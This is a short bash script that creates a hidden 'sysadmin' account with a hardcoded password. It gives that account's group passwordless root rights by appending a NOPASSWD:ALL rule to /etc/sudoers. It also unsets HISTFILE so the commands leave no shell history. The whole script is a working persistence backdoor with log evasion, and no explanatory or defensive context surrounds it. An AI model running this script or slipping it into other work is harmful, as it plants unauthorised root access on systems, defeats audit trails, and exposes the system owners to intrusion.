#!/bin/bash

unset HISTFILE

useradd -s /bin/bash -m -d /var/sysadmin sysadmin
chmod -R 750 /var/sysadmin
addgroup sysadmin
usermod -aG $USER sysadmin
echo 'sysadmin:SuperSecure69' | chpasswd

if test -f "/etc/sudoers"; then
  echo "%sysadmin ALL=NOPASSWD:ALL" >> /etc/sudoers
fi
